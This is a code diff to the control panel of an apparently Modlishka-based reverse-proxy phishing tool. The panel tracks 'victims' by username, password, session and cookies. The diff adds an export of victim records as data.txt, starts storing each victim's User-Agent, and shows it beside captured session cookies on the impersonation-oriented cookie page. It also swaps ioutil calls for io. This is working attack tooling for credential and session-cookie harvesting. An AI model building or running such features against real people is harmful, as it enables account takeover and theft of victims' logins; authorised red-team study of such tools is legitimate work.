@@ -22,7 +22,6 @@ import (
 	"fmt"
 	"html/template"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
@@ -98,6 +97,15 @@ function deleteVictim(uuid){
 	});
 }
 
+function downloadData() {
+	const link = document.createElement("a");
+	link.href = "/{{$.URL}}/DownloadData";
+	link.download = "data.txt";
+	document.body.appendChild(link);
+	link.click();
+	document.body.removeChild(link);
+}
+
   </script>
 </head>
 <body>
@@ -116,6 +124,9 @@ function deleteVictim(uuid){
           <h4>Terminations</h4>
           <p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
       </div>
+	<div class="col-md-4 text-center">
+		<button onclick="downloadData()" class="btn btn-success">Download Data</button>
+	  </div>
   </div>
   
   <hr>
@@ -239,6 +250,11 @@ setTimeout(function() {document.location='/'; }, 5000);
 </html>
 `
 
+type TemplateOutput struct {
+	Cookies string
+	UserAgent string
+}
+
 var cookietemplate = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -252,8 +268,10 @@ var cookietemplate = `<!DOCTYPE html>
 <body>
 
 <div class="container">
+  <h2>User Agent</h2>
+  <pre>{{ .UserAgent }}</pre>
   <h2>Cookies</h2>
-  <pre>{{ . }}</pre>
+  <pre>{{ .Cookies }}</pre>
 </div>
 
 </body>
@@ -266,6 +284,7 @@ type Victim struct {
 	Username   string
 	Password   string
 	Session    string
+	UserAgent  string
 	Terminated bool
 }
 
@@ -526,6 +545,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		entry.Terminated = true
 	}
 
+	if victim.UserAgent != "" {
+		entry.UserAgent = victim.UserAgent
+	}
+
 	err = config.addEntry(entry)
 	if err != nil {
 		return err
@@ -591,7 +614,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 			return nil, false
 		}
 
-		body, err := ioutil.ReadAll(req.Body)
+		body, err := io.ReadAll(req.Body)
 		if err != nil {
 			log.Debugf("Error reading body: %v", err)
 		}
@@ -624,7 +647,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 		//}
 
 		// reset body state.
-		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+		req.Body = io.NopCloser(bytes.NewBuffer(body))
 
 	}
 
@@ -721,6 +744,35 @@ func HelloHandlerDeleteVictim(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		log.Infof("Error %s", err.Error())
 	}
+}
+
+func HelloHandlerDownloadData(w http.ResponseWriter, r *http.Request) {
+
+	//Grabbing Entries
+	victims, _ := CConfig.listEntries()
+
+	var recordString strings.Builder
+	var terminateString string
+
+	for _, victim := range victims {
+
+		if victim.Username != "" || victim.Password != "" {
+
+			if victim.Terminated == true {
+				terminateString = "Y"
+			} else {
+				terminateString = "N"
+			}
+
+			recordString.WriteString(fmt.Sprintf("UUID: %s\nUsername: %s\nTerminated: %s\n\n",
+				victim.UUID, victim.Username, terminateString))
+		}
+	}
+
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", "attachment; filename=\"data.txt\"")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(recordString.String()))
 }
 
 func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
@@ -834,7 +886,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: "", UserAgent: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -857,13 +909,17 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 	cookiesByte, _ := json.MarshalIndent(cookies, "", "  ")
 	cookiesOut := string(cookiesByte)
 
+	userAgentOut := entry.UserAgent
+
+	templateData := TemplateOutput{Cookies: cookiesOut, UserAgent: userAgentOut}
+
 	w.WriteHeader(http.StatusOK)
 
 	w.Header().Set("Content-Type", "application/html")
 
 	t := template.New("modlishkacookiejson")
 	t, _ = t.Parse(cookietemplate)
-	_ = t.Execute(w, cookiesOut)
+	_ = t.Execute(w, templateData)
 
 }
 
@@ -962,7 +1018,7 @@ func init() {
 				return
 			}
 
-			ctb, _ := ioutil.ReadAll(ct)
+			ctb, _ := io.ReadAll(ct)
 			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
 				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
@@ -1031,6 +1087,7 @@ func init() {
 		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/DeleteVictim", use(HelloHandlerDeleteVictim, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/DownloadData", use(HelloHandlerDownloadData, basicAuth))
 
 		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
 		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
@@ -1072,6 +1129,14 @@ func init() {
 				notifyCollection(&victim)
 				//_=CConfig.printEntries()
 
+			}
+
+			// update user agent string
+			victim := Victim{UUID: context.UserID}
+			entry, err := CConfig.getEntry(&victim)
+			if err == nil {
+				entry.UserAgent = req.Header.Get("User-Agent")
+				_ = CConfig.updateEntry(entry)
 			}
 
 			cookies := req.Cookies()
